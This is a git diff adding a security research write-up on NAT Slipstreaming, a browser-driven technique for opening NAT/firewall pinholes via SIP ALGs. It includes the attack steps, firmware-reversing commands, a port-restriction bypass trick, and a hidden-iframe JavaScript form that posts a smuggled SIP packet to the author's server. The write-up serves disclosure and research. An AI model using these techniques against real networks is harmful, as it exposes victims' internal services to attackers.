@@ -1,2 +1,582 @@
-# slipstream
-NAT Slipstreaming allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim’s NAT/firewall, just by the victim visiting a website
+NAT Slipstreaming
+======================
+
+[NAT Slipstreaming](https://samy.pl/slipstream/) allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website.
+
+**Developed by**: [@SamyKamkar](https://twitter.com/samykamkar) // [https://samy.pl](https://samy.pl)
+
+**Released**: October 31, 2020
+
+**Source code**: <https://github.com/samyk/slipstream>
+
+**Exploit server**: <https://samy.pl/slipstream/server>
+
+**Tested on latest versions of**: Chrome, Safari, Firefox, Brave, Edge, IE
+
+<!-- ![NAT architecture](img/natarch.png) -->
+<iframe frameborder=0 style="width:1000px;height:800px;" src="//samy.pl/draw/?p=anim&lightbox=1&highlight=0000ff&nav=1&title=natpin.drawio#R7Zxbc9u2EoB%2FjWZ6HuzBhddHR7aTzuSkmZM27StIQhJj3sqLJPfXHwAiKRIAZVGmbDm1NOORViCwxH5cLBaAZ3gebz%2FmJFv9Nw1oNEMg2M7w7Qwhx4XsLxc87gQ2%2F8YFyzwMdiK4F3wL%2F6G1ENTSKgxo0StYpmlUhllf6KdJQv2yJyN5nm76xRZp1G81I0uqCL75JFKlf4ZBuapvywR7%2BScaLldNyxDUv3jEf1jmaZXU7c0QXojX7ueYNHXV5YsVCdJNR4TvZniep2m5%2B%2FRHQfPfvB%2F8HhGIiMe6ua5X3GoSshrDNNkJixWrit3tpx9Xj9vsH%2FuzQ8rHT5vv%2F7M%2BX%2FHawYIEdIYsphTraPzhUHlsDZaHxGGKUEwsfxEsELhyji8K0fFlD6gcmMSHhuNR37OB51%2B5R5eEx1d6QFdtl8GRPTyuuD2u%2BLBN9LqPvdeR2sOx%2BgxbVI%2F3yM5Hw3jrjTXWuCP7BxvjypvmYPnq99%2B%2B%2FPCoaX%2B5X2SLP5e3n6F3yL768iP116izISF3WhBx39hKhz7y9tahX4Yx%2B3DFflqWQg4SUh6rw8h71CCwiA4XL0qSl%2BPuETf30LurMClpnlDNrenNocHjkK6i%2FInK7lXrabyhXhGWR%2FOjed4PKuycrjApSzbq0lxSuKHpOHaGhwW9vhr%2FdPD%2B3EnuL6dllScFDzQqz4s02m4Aiv%2B6Mb5%2BfHi4QdUP6JP5RjcyPdl2UwAAqQR%2Fypogbh%2ByxNs5jVgMeL%2F7yj50QpdeCRDKsVhOk7IbFd0PXDB0b7yWNYmqOnjT9heLkZAVcTS8fA%2FJTlJkJGlkJOL0Ew46uwmLxBkTJl6RdcozDbuXNOKqrSP3wjIn%2BWPngupQo8OqqU31NMpSAZRysQgty8cmnC3plstXZczDR8hbL%2FP0gc7TKM1FEew5pmEKisMo6sgXjk99X3RMuORxpk%2B5f2CCNc3LkIXMN%2FUPcRgEvMEPmxXzE98y4vPWN2x%2BwGQiJKZB3foiTco66Eeg%2Fn5P4jDi04V5WuWhsN4XumkK1%2FfCL15GpODhPb%2FQT%2BPQrz%2B3ofQe0y5aDSdMa7rtiGrUPtI0piU3GWh%2BxcDdXfPYRPmOdW3uRJv9rABZdSy%2F6swI7GYyUk9Elm31qPuM1IjrcR8c5CTe22Ezp39XtCiLnbcWcxz%2BRNXI7P4yCd1SvyopL0bXIW%2FxB1mTws%2FDrAdThyDr74rPSIQtrgphuRtWgPXwdv%2FjCPwuBiYxpfrQTtoa8JM0oeqzEBDqLHzd02P5DvUWE3HHwOtzByxHpQ4jlToHnIs6cMjL%2BtxBgUSMP8T3acHRIgm%2Fp9LPuPMLMt4rwlkJT7wP9WLir8KEg8om%2FJkIMMCXm99HcmicyOHluEHjUt2giyQazSZJ06HRQBofyLh9Po6D0ZSEo2JsmgQ3PBPEvnlR6j%2FoDN%2FkdkwmocGSNv0bFkLR0L%2FbCz%2BwCu%2FDqKlgiI9hogZtwVs%2BaIlOR5uafm5kOY1IGa77KSxd39ctfE1ZqH%2FA0LYluZOCIenT%2BrJunCbVBA25KoikqlgkvKSlUhWzGHnsFMt4geKAzrbUkGX2Qkj2YVflnrW2X0%2F3hkj1hq0%2FY49iVnHPoERlEFzzt%2FnGhlgwe7EhthZNMYYasA%2BGa9rqEAoMTeB2riEUW0%2F7rMZEn3mXfU3ZfHuX2%2FXSskzjvn1lc5Zppvg1LQdpVUZsxJ23qXNu0YAUq9bc2hJsXMm4mvF2yVP%2B12RT4OB6wVzObVqxqeid8GKyXwTixdUosl1di3DLGzqCoQ5w04RVdg8JxzUUJCzXUpHArv18JnRJ89fAoWdovU39KK2CRZ4mpWrPuzl%2F68Y5846%2FdZbuBz29%2BKQbuHRsDlH9XUfSBCzYCDcTuWbgwKZKAwT42tHENZZ7bbudl3MGPKA6z7sUPnIaFKtwoaFjPq9tpNBxZ%2FH3G6HDNWU6bFONeaEuFoPuBOOHdiXsQmEowjiL6K2HVBruxeut0wAtJKeBoC4NBKEOBziBb9Asdl4oDLsiYtoV0aLQhwSBSZ3AeKbx28jhO80DkhANEwp1DvKwZU3kI%2BQcDTQtTTShydHgJuyYEgl4uQ7iophYRGH2fTaQ%2B5mUD2T05x%2BapAl2NB6DjTVnwONyg4mj8Ki30LwuHoHlWeZEeEDDlPwHxhpAbM1shMUdzwdkaP%2FKzzdB9auCaUbzj6SkG54ImmJGMwEBrqkEmQhpogrb1UQV5gRRxdCeJAkBkYsHAV2HPj0hcyVSVlLy6hf20DJL%2F2ei6hRIn0rzD2eeLiRnNgFdwJbpgpZmgqubwpwtA2YqcHXWkAqar3VZ01%2F8lO9bADT2aMB7l68dEa5eIIxT0Jh3k7JSDzSilDcUhDl7mCPeWSuxw8F7nDXrUacg%2BS%2FgUZlf3d9j9prGEVpATuFjFVQDmxpQzzUQ2gqov%2B63a73zoeEjT8tmH%2FJE025LXtlBzmv7r1fK2J43Ptqk%2BYOodYKw6KVT%2BgaSxjjTRiojjmaVB6IJJuGDG6l%2FPkqOmqVdzlqP2Zw%2FaccUx9Cl7LTBNTjX1i2oRtf7TbVy2LMO%2BQ%2FBe3zyIvEyNqTRxnA168WWxpOcbcsV%2FCmHG5JlEdOC66lZMeAv%2FYoBX2YTv7y6b4EGNOS5FUAqLRDYKi1NQnh6Wl5pUeDMyZsoFIZSrf6kh2LM2OL1OohIu09cV%2BHD1K0sg3N5E6Qm93bnPIi4NBvcrgTfh5zzDDmw3R7ZpoAB0AUpLzrHQeoupazymMseoARd42vjxfa0%2FesgcR1lrMGW6ktelhE85EvEmbH6SLYIXdM11Ry7qT3L7uTROzbn8C1WEz22EQq2db5FtwJ5Pm7U%2Bc9PEKOwGdzbzJ5ABPqQuFjdwgCbfEaPEHwuQgyFkCIWZyZBkKZ5TDSH3Vpvgt69yZm8CTKgNAo5lorKy26nNtXVpE5Ay4YintgcRwTGp68wnsnYYpHlaGPjKYyN5Z1N7TaVrlvQ7Wxqd8BNft7niK3zo4%2F7HDrN85yDfhdymgdiV96hJpvn6OM8UN6s0ir5xHGeEw7cDP73iskBGHfeqw0P9HuDIH%2B%2FBSws%2BfFGxslYyIQpydCJTnlBQ14MbJzUVMe8Bv8HykVTdwv5%2By1Qh6CyHwWANqgYT558vhDJvm0q8qC8OwEaL0GeGge%2FD3hPHV%2FFjpoqcU5FzJEOi0EDSXvuzj3kHbH8845A32g2AjIChuueioDpKIfETAfJtZ2MAfu6%2Fzd%2Fu%2BL7f6WI7%2F4P"></iframe>
+
+*generated with [my fork](https://github.com/samyk/drawio) of [draw.io](draw.io), allowing exportable edge context flow & control in animations*
+
+
+Table of Contents
+=================
+
+
+   * [Summary](#summary)
+   * [The deets](#the-deets)
+      * [Network Address Translation (NAT)](#network-address-translation-nat)
+         * [Connection Tracking](#connection-tracking)
+         * [Application Level Gateway](#application-level-gateway)
+      * [Router Investigation / Firmware Dumping](#router-investigation--firmware-dumping)
+      * [Reverse Engineering Firmware](#reverse-engineering-firmware)
+         * [Finding Interesting Files](#finding-interesting-files)
+         * [Exploring interesting functions](#exploring-interesting-functions)
+         * [Ports / Services to investigate](#ports--services-to-investigate)
+         * [Reversing the Kernel Object](#reversing-the-kernel-object)
+      * [Connection Tracking / Application Level Gateway Investigation](#connection-tracking--application-level-gateway-investigation)
+         * [Linux Netfilter](#linux-netfilter)
+      * [Packet Boundary / Fragmentation Control](#packet-boundary--fragmentation-control)
+      * [TCP Timing Attack / Internal Subnet &amp; IP Discovery](#tcp-timing-attack--internal-subnet--ip-discovery)
+         * [Timing Attack](#timing-attack)
+      * [Browser Protocol Confusion](#browser-protocol-confusion)
+         * [Live Browser Packet Alteration](#live-browser-packet-alteration)
+   * [Other Findings](#other-findings)
+   * [Example / Download](#example--download)
+   * [Contact](#contact)
+
+# Summary
+
+NAT Slipstreaming exploits the user's browser in conjunction with the Application Level Gateway (ALG) connection tracking mechanism built into NATs, routers, and firewalls by chaining internal IP extraction via timing attack or WebRTC, automated remote MTU and IP fragmentation discovery, TCP packet size massaging, TURN authentication misuse, precise packet boundary control, and protocol confusion through browser abuse.
+
+This works across all major modern (and older) browsers as of 2020, and is an update to my original [NAT Pinning technique from 2010](https://samy.pl/natpin/) (presented at DEFCON 18 + Black Hat 2010). This requires the NAT/firewall to support ALG (Application Level Gateways), which are mandatory for protocols that can use multiple ports (control channel + data channel) such as SIP and H323 (VoIP protocols), FTP, IRC DCC, etc.
+
+This also contains new techniques for discovering a victim's local IP address and forcing the victim to transmit arbitrary data in TCP and UDP packets by the user visiting a page.
+
+**At a high level, NAT Slipstreaming works like so:**
+
+- victim visits malicious site (or site with malicious advertisement), eg [https://samy.pl/slipstream/](https://samy.pl/slipstream/server)
+- internal IP of victim first must be extracted by browser and sent to server
+  - internal IP attempted to be extracted via [WebRTC](https://www.w3.org/TR/webrtc/) data channel over https
+    - but some browsers (Chrome) only divulge the local IP via WebRTC over HTTPS, but some of our attacks require HTTP, so we first redirect to the HTTPS version of the attack software to extract the local IP
+    - we then redirect to the HTTP version with the local IP included in the URL if we were able to obtain it to bypass other cross-origin protection mechanisms (the `.local` mDNS/Bonjour address presented will not be useful for the attack)
+  - if internal IP not divulged by WebRTC (Safari) or no WebRTC (<= IE11), **web-based TCP timing attack performed**
+     - hidden `img` tags to all common gateways (eg `192.168.0.1`) are loaded in background
+     - `onerror/onsuccess` events attached to `img` tags
+     - if any TCP RST returned by gateway (or SYN + HTTP response), we've detected valid subnet
+     - re-perform timing attack across all IPs on detected subnets (/24), measuring time to onerror/onsuccess firing
+     - fastest response is likely internal IP, though all responses are considered victim internal IP candidates and attacked
+- large TCP beacon sent via hidden form and automatic HTTP POST to attacker "HTTP server" bound to a non-standard port to force TCP segmentation and maximum MTU size discovery of the victim's IP stack
+  - attacker TCP server sends [Maximum Segment Size](https://tools.ietf.org/html/rfc793#section-3.1) TCP Option to massage victim outbound packet sizes ([RFC 793 x3.1](https://tools.ietf.org/html/rfc793#section-3.1)), allowing control of how large browser TCP packets will be
+- large UDP beacon sent from browser via WebRTC TURN authentication mechanism to non-standard port to attacker's server to force IP fragmentation with TURN `username` field stuffed
+  - we perform a similar attack as our TCP segmentation, but over UDP as IP fragmentation will occur and provide different values than TCP segmentation
+  - victim MTU size, IP header size, IP packet size, TCP header size, TCP segment sizes detected by server and sent back to victim's browser, used later for packet stuffing
+- "SIP packet" in new hidden form generated, containing internal IP to trigger Application Level Gateway connection tracking
+  - "HTTP POST" to server on TCP port 5060 (SIP port) initiated, avoiding [restricted browser ports](https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90)
+  - POST data is "stuffed" to exact TCP segment size / packet boundary, then "SIP packet" appended and posted via web form
+  - victim IP stack breaks POST into multiple TCP packets, leaving "SIP packet" (as part of POST data) in its own TCP packet
+  - if browser alters size of multipart/form boundary (Firefox) or packet size changes for any other reason, size change is communicated back to client and client auto-resends with new size
+  - when opening UDP port, SIP packet is sent over TURN protocol inside specially crafted `username` field forcing IP fragmentation and precise boundary control
+- victim NAT sees proper SIP REGISTER packet on SIP port (with no HTTP data), triggering ALG to open any TCP/UDP port defined in packet back to victim
+  - victim NAT rewrites SIP packet, replacing internal IP with public IP, hinting to attacker exploit was successful
+  - even if victim NAT normally rewrites source ports, the ALG will still be forced to port forward to the attacker's port of choice as it believes victim machine opened that port and attacker sees new source port in arriving SIP packet 
+  - attacker can now bypass victim NAT and connect directly back to any port on victim's machine, exposing previously protected/hidden services
+
+[![successful packet broken into valid SIP packet](img/pinpkt2.png)](img/pinpkt2.png)
+
+
+# The Deets
+
+## Network Address Translation (NAT)
+
+We use NATs (Network Address Translation) for several reasons. The most useful feature of NAT is that it allows a single public IP address to be shared among multiple systems. It does this by creating a local network, providing local IP addresses to all machines that connect, and when one of those systems reaches out to the Internet, it rewrites packets going out to use the public IP so responses come back to the NAT, and vice versa, rewriting desination IP to specific client's IP. 
+
+It's the responsibility of the NAT to differentiate connections to the same addresses/ports (google.com:443) from internal hosts as ultimately their outbound port, destination ip and source ip will all be the same. If two different internal peers attempt to connect from the same source port, modern NATs will alter one of the source ports (some networks do this to all TCP/UDP source ports).
+
+![NAT](img/lan.png)
+
+### Connection Tracking
+
+From [Wikipedia ala Wikiwand](https://www.wikiwand.com/en/Netfilter):
+
+```
+One of the important features built on top of the Netfilter 
+framework is connection tracking. Connection tracking 
+allows the kernel to keep track of all logical network 
+connections or sessions, and thereby relate all of the packets
+which may make up that connection. NAT relies on this 
+information to translate all related packets in the same way, 
+and iptables can use this information to act as a stateful 
+firewall.
+```
+
+If a machine behind your NAT sends a packet out and your router expects the remote host may respond, it keeps track of information, specifically the source and destination ports, source and destination IP addresses, and your internal IP, then returns any packets matching it back to your internal IP.
+
+If another host on your LAN attempts to make the same connection with the same source and destination ports + IPs, your NAT wouldn't be able to discriminate it, so it alters the source port, but rewrites it when sending back to you.
+
+### Application Level Gateway
+
+ALGs allow NAT to track a multi-port protocol like FTP to go out from your system to an FTP server, then track when you request a file to be sent to your internal IP on a specific port, the ALG can rewrite the packet to include your public IP, then forward the FTP's server connection back to you. Had it not rewritten your IP, the FTP server would try to connect back to you on your internal IP (or not try at all if it expects the source IP to be the same as the signaling connection).
+
+From [Wikipedia](https://www.wikiwand.com/en/Application-level_gateway):
+
+```
+In the context of computer networking, an application-level 
+gateway consists of a security component that augments a 
+firewall or NAT employed in a computer network. It allows 
+customized NAT traversal filters to be plugged into the 
+gateway to support address and port translation for certain 
+application layer "control/data" protocols such as FTP, 
+BitTorrent, SIP, RTSP, file transfer in IM applications, etc. 
+In order for these protocols to work through NAT or a 
+firewall, either the application has to know about an address/
+port number combination that allows incoming packets, or the 
+NAT has to monitor the control traffic and open up port 
+mappings (firewall pinhole) dynamically as required. 
+Legitimate application data can thus be passed through the 
+security checks of the firewall or NAT that would have 
+otherwise restricted the traffic for not meeting its limited 
+filter criteria.
+```
+
+## Router Investigation / Firmware Dumping
+
+I'd first like to see how common gateways actually treat packets and multi-port protocols like FTP, SIP, etc. To do this, we'll want to reverse engineer the firmware from common routers. We could dump the flash from physical routers, however if we can get unencrypted firmware from the manufacturers, we'll be able to investigate more router models and much faster.
+
+We'll start with a common router, the Netgear Nighthawk R7000. A [quick search](http://bfy.tw/NjZh) helps us find a [Netgear article](https://kb.netgear.com/000060566/R7000-Firmware-Version-1-0-9-64) with [recent firmware](http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip). Once we download the firmware and unzip, we find a 30MB file called R7000-V1.0.9.64_10.2.64.chk.
+
+```sh
+tigerblood:~c/ng$ wget http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip
+--2019-05-19 19:21:13--  http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip
+Resolving www.downloads.netgear.com (www.downloads.netgear.com)... 104.69.65.243
+Connecting to www.downloads.netgear.com (www.downloads.netgear.com)|104.69.65.243|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31705064 (30M) [application/zip]
+Saving to: ‘R7000-V1.0.9.64_10.2.64.zip’
+
+R7000-V1.0.9.64_10.2.64.zip  100%[=============================================>]  30.24M  6.25MB/s    in 11s
+
+2019-05-19 19:21:24 (2.83 MB/s) - ‘R7000-V1.0.9.64_10.2.64.zip’ saved [31705064/31705064]
+
+tigerblood:~c/ng$ unzip R7000-V1.0.9.64_10.2.64.zip
+Archive:  R7000-V1.0.9.64_10.2.64.zip
+ extracting: R7000-V1.0.9.64_10.2.64.chk
+  inflating: R7000-V1.0.9.64_10.2.64_Release_Notes.html
+tigerblood:~c/ng$ file R7000-V1.0.9.64_10.2.64.chk
+R7000-V1.0.9.64_10.2.64.chk: data
+tigerblood:~c/ng$ ls -lh R7000-V1.0.9.64_10.2.64.chk
+-rw-r--r--  1 samy  staff    30M Mar 26 11:46 R7000-V1.0.9.64_10.2.64.chk
+```
+
+![R7000-V1.0.9.64_10.2.64.chk](img/ngchk.png)
+
+The `file` command doesn't detect any [magic info](https://www.wikiwand.com/en/Magic_number_(programming)), so we can use [`binwalk`](https://github.com/ReFirmLabs/binwalk) to scan the file for nested data.
+
+```sh
+tigerblood:~c/ng$ binwalk R7000-V1.0.9.64_10.2.64.chk
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+58            0x3A            TRX firmware header, little endian, image size: 31703040 bytes, CRC32: 0xBEF1BB2F, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21E3F0, rootfs offset: 0x0
+86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5436416 bytes
+2221098       0x21E42A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 29475437 bytes, 1988 inodes, blocksize: 131072 bytes, created: 2018-12-26 04:15:38
+```
+	
+![binwalk R7000-V1.0.9.64_10.2.64.chk](img/ngbinwalk.png)
+
+I use macOS and binwalk depends on some Linux apps out of the box which would cause `binwalk -e` (which extracts files) to fail so I extract manually (and I <3 perl golf).
+
+```sh
+tigerblood:~c/ng$ perl -ne'$@.=$_}{print+substr$@,2221098' R7000-V1.0.9.64_10.2.64.chk > squash.fs
+```
+
+Or use [`inout`](https://github.com/samyk/samytools/blob/master/inout), eg `inout R7000-V1.0.9.64_10.2.64.chk 2221098`.
+
+You could use `dd`, however you'd want a large `bs` (block size) so that it would output quickly, eg 1024, however the `skip` attribute (to tell it to start at the location of the squashfs blob) would respect the block size and 2221098 isn't obviously divisible in anything quickly in my head other than 2...now I'm curious.
+
+```sh
+tigerblood:~c/ng$ time dd if=R7000-V1.0.9.64_10.2.64.chk skip=$((2221098/2)) bs=2 of=squash.fs2
+14741000+0 records in
+14741000+0 records out
+29482000 bytes transferred in 78.363403 secs (376222 bytes/sec)
+
+real	1m18.385s
+user	0m12.553s
+sys  	1m4.451s
+```
+
+Now let's unpack the squash filesystem. I've created a [fork of a fork of squashfs-tools](https://github.com/samyk/squashfs-tools) that runs on macOS and has `lzo` support. You may need to install `xz` and `lzo` as well. Alternatively, you could use [`sasquatch`](https://github.com/devttys0/sasquatch) on Linux.
+
+```sh
+tigerblood:~c/ng$ sudo port install xz lzo
+...
+tigerblood:~c/ng$ git clone https://github.com/samyk/squashfs-tools && cd squashfs-tools/squashfs-tools && make && sudo make install && cd ../..
+```
+
+And finally we can unpack the squash fs.
+
+```sh
+tigerblood:~c/ng$ unsquashfs -l -no squash.fs
+Parallel unsquashfs: Using 8 processors
+1881 inodes (2535 blocks) to write
+
+squashfs-root
+squashfs-root/bin
+squashfs-root/bin/addgroup
+... (many more files) ...
+
+tigerblood:~c/ng$ cd squashfs-root && ls
+bin   data  dev   etc   lib   media mnt   opt   proc  sbin  share sys   tmp   usr   var   www
+```
+
+We now have the raw OS to explore!
+
+## Reverse Engineering Firmware
+
+### Finding Interesting Files
+
+Now let's see if we can find any files relevant to FTP as it was a heavily used protocol so ALG support will be rampant across routers. I use my [`g tool`](https://github.com/samyk/samytools/blob/master/g) which is just a convenient wrapper around `egrep`.
+
+```sh
+tigerblood:~c/ng/squashfs-root$ find . | g ftp
+./usr/bin/tftp
+./usr/sbin/bftpd
+./usr/sbin/ftp
+./usr/sbin/ftpc
+./usr/etc/sftp-ssh.service
+```
+
+Nothing interesting, so let's `g` for binary files whose content matches /ftp/, ignoring some files we don't care about.
+
+```sh
+tigerblood:~c/ng/squashfs-root$ g -la ftp -v '\.(html?|js|gif)$|www/|bin/'
+lib/libsmbd-base-samba4.so
+lib/libavformat.so.55
+lib/libavutil.so.52
+lib/libavcodec.so.55
+lib/modules/tdts.ko
+lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko
+lib/libcrypto.so.1.0.0
+opt/xagent/certs/ca-bundle-mega.crt
+usr/etc/sftp-ssh.service
+usr/lib/libnvram.so
+usr/lib/libcurl.a
+usr/lib/libcurl.so.4.3.0
+usr/lib/libcurl.so
+usr/share/avahi/service-types
+usr/share/libcrypto.so.1.0.0
+```
+
+ [`g`](https://github.com/samyk/samytools/blob/master/g) recursively scans the current working directory by default. `-l` is to only print file names (as these will be mostly binary), `-a` to scan binary files, `ftp` for text to match, and `-v '\.(html?|js|gif)$|www/|bin/'` to ignore web files and executables (sitting in (s)bin/).
+
+Any `lib/lib*.{a,so}{.*,}` (bash format) files are uninteresting, so let's scan again with less:
+
+```sh
+tigerblood:~c/ng/squashfs-root$ g -la ftp -v '\.(html?|js|gif)$|www/|bin/|lib.*\.(so|a)(\.|$)'
+lib/modules/tdts.ko
+lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko
+opt/xagent/certs/ca-bundle-mega.crt
+usr/etc/sftp-ssh.service
+usr/share/avahi/service-types
+```
+
+### Exploring Potentially Useful Functions
+
+Okay, two files of interest -- `lib/modules/tdts.ko` could be related, and `lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko` is probably not related but sounds interesting! May investigate that later.
+
+```sh
+tigerblood:~c/ng/squashfs-root$ file lib/modules/tdts.ko
+lib/modules/tdts.ko: ELF 32-bit LSB relocatable, ARM, EABI5 version 1 (SYSV), BuildID[sha1]=0aa35748e245e60273ceb5a48641e424d069235b, not stripped
+tigerblood:~c/ng/squashfs-root$ strings lib/modules/tdts.ko | g ftp
+ftp_decoder_open
+ftp_decoder_close
+ftp_decode_epsv_resp
+ftp_decode_eprt_cmd
+ftp_decode_pasv_resp
+ftp_decode
+ftp_decode_port_cmd
+ftp_decoder
+check_ftp_ft_rule
+```
+
+Nice! A kernel object (.ko) with ftp functions, and with words like "port", it's likely related to an FTP ALG. The [FTP RFC 959](https://tools.ietf.org/html/rfc959) explains the meaning of the `PORT` command:
+
+```
+DATA PORT (PORT)
+
+The argument is a HOST-PORT specification for the data port
+to be used in data connection.  There are defaults for both
+the user and server data ports, and under normal
+circumstances this command and its reply are not needed.  If
+this command is used, the argument is the concatenation of a
+32-bit internet host address and a 16-bit TCP port address.
+This address information is broken into 8-bit fields and the
+value of each field is transmitted as a decimal number (in
+character string representation).  The fields are separated
+by commas.  A port command would be:
+    PORT h1,h2,h3,h4,p1,p2
+where h1 is the high order 8 bits of the internet host
+address.
+```
+
+### Ports / Services to Investigate
+
+While we've found some FTP functions, we're more interested in ports that we can use. Modern browsers prevent outbound HTTP(S) connections to a number of [restricted ports](https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90), including FTP, so abusing the FTP ALG is likely a no-go.
+
+In 2010, when I [first demonstrated NAT Pinning](https://samy.pl/natpin/), I used port 6667 (IRC) via the DCC CHAT/FILE messages. Quickly, browser vendors blocked port 6667...though some used a uint32 (32 bit unsigned integer) to store the port, check if the port was blocked, and if not, connect. To evade this, it's important to note TCP ports are 16 bits long, so if you add 2**16 (65536) to the "restricted" port of choice, in this case 65536+6667=72203, the browser would store 72203, it would pass the port restriction (72203 != 6667), then would get sent off to the TCP stack where it gets truncated to 16 bits which is the restricted port we wanted!
+
+My simple [`base calculator, 3`](https://github.com/samyk/samytools/blob/master/3) shows this (db = dec -> bin):
+
+```sh
+tigerblood:/Users/samy/d$ 3 db 65536 6667 65536+6667
+000000010000000000000000
+000000000001101000001011
+000000010001101000001011
+```
+
+We can see it better using my [`diffbits`](https://github.com/samyk/samytools/blob/master/diffbits) tool, a simple tool for viewing similarities and differences between bit strings, as well as between multiple groups of bit strings, useful for reversing proprietary, binary protocols.
+
+![diffbits](img/diffbits.png)
+
+
+### Reversing the Kernel Object
+
+Go ahead and open your disassembler of choice. I've used [Ghidra](https://ghidra-sre.org) from our friends at the [NSA](https://github.com/NationalSecurityAgency/) as it's free and open source.
+
+Some of the functions we saw in `tdts.ko` via `strings` was `ftp_decode` and `ftp_decoder`, so it's possible other ALGs will have a `_decode` function. Let's look...
+
+![Ghidra _decode](img/ghidraftp.png)
+
+Alright, a bunch of _decode functions...scrolling down, an interesting one is `sip_decode`.
+
+![Ghidra tdts.ko](img/ghidra-sip.png)
+
+Checking our [restricted browser ports](https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90), we see 5060, the default SIP port, is not restricted in Chrome :)
+
+### Attempting SIP Packet in HTTP POST
+
+SIP lives on TCP/UDP 5060, but media like RTP (audio) is sent on alternate ports that are generated on the fly. When sending a request for a SIP call, your SIP client chooses a random port, opens it, and includes it in the SIP header. Your NAT should also see it and open it up, assuming the SIP ALG is enabled (and is on most routers by default).
+
+Assuming NATs reader SIP packets line by line (SIP is newline-based like HTTP and is not a binary protocol), perhaps it will ignore the HTTP header and once it gets to the POST data, read the REGISTER and believe it's a SIP packet. This worked in our 2010 version for the IRC DCC. The NAT ignored the HTTP header and just parsed the IRC DCC command.
+
+Funny thing, this also allowed us to actually make users who visit our site connect to a *legitimate* IRC server, join a channel, and send a message from their IP without them knowing! :P I demo'd this technique fo sending email to mail servers with client IP addresses before port 25 was blocked by browsers and before SPF records were common...craziness.
+
+Now, in a quick test, sending a SIP REGISTER packet over port 5060 through an HTTP POST doesn't seem to work...perhaps we're missing something from the packet.
+
+```javascript
+// our sip message
+var sipmsg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\n' +
+             'Contact: <sip:samy@192.168.0.109:1234;transport=TCP>\r\n\r\n'
+
+// load form in an iframe so user doesn't se it
+var iframe = document.createElement('iframe')
+iframe.name = 'iframe'
+iframe.style.display = 'none' // hide the iframe
+
+// create form
+var form = document.createElement('form')
+form.setAttribute('target', 'iframe') // load into iframe
+form.setAttribute('method', 'POST') // need the POST area where we can add CRLFs
+form.setAttribute('action', 'http://samy.pl:5060') // "http" server on SIP port 5060
+form.setAttribute('enctype', 'multipart/form-data') // ensure our data doesn't get encoded
+
+var textarea = document.createElement('textarea')
+textarea.setAttribute('name', 'textname') // required
+textarea.innerHTML = sipmsg
+form.appendChild(textarea)
+document.body.appendChild(iframe)
+document.body.appendChild(form)
+form.submit()
+```
+
+If we sniff, we see (parsed via [`h2b`](https://github.com/samyk/samytools/blob/master/h2b)):
+
+```sh
+$ unbuffer tcpdump -X port 5060 | h2b
+POST / HTTP/1.1
+Host: samy.pl:5060
+Connection: keep-alive
+Content-Length: 191
+Cache-Control: max-age=0
+Origin: http://samy.pl
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhcoAd2iSAx3TJA7A
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.66 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://samy.pl/o/sp.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+------WebKitFormBoundaryhcoAd2iSAx3TJA7A
+Content-Disposition: form-data; name="textname"
+
+REGISTER sip:samy.pl;transport=TCP SIP/2.0
+Contact: <sip:samy@192.168.0.109:1234;transport=TCP>
+
+
+------WebKitFormBoundaryhcoAd2iSAx3TJA7A--
+```
+
+However, this doesn't open the port, nor is the IP rewritten which we'd expect (more on this later), so we must be missing something.
+
+### Continue Reversing Kernel Object Further
+
+Let's keep digging in the kernel object. In the diassembly, we see the "SIP/2.0" tag from a SIP packet, so it's likely parsing here (which "decode" sounds like).
+
+![Ghidra sip_decode](img/ghidrabne2.png)
+
+Ah, this is why we fail. Looks like it's running strncasecmp on [INVITE](https://tools.ietf.org/html/rfc2543#section-4.2.1) (similar parsing on REGISTER) -- matching (case-insensitive, which is interesting as SIP INVITEs are upper case) the word "INVITE" at the beginning of the packet and **b**ranches if **n**ot **e**qual (ARM assembly `bne`) to 0, so if the words do match, the lexicographical order will be 0 and we'll continue to `ct_sip_get_header` which sounds fun, and seems to bail otherwise.
+
+This is the problem...while we can use a web browser to produce outbound sockets (TCP via HTTP(S), UDP via TURN w/WebRTC), we don't have enough control over the browser to start the TCP data portion with the word "INVITE", which this module expects. In the [2010 IRC version](https://samy.pl/natpin/), the IRC ALG only looked line by line, ignoring all the HTTP header data, then using newlines in the POST data to send a valid "IRC DCC". However, this SIP ALG is much more strict and controlling the beginning of the request is not possible. If using TLS, encrypted header will start the packet. If using HTTP, the HTTP method will begin the packet (GET, POST, etc). Can we exploit this some other way?
+
+## Connection Tracking / Application Level Gateway Investigation
+
+### Linux Netfilter
+
+To better understand connection tracking and Application Level Gateways, we can look to see how they behave in [netfilter, Linux's network stack](https://github.com/samyk/linux/tree/master/net/netfilter). I've created a chart of the most common ALGs and how they behave based off of parsing the Linux source.
+
+![Linux ALG](img/alg.png)
+
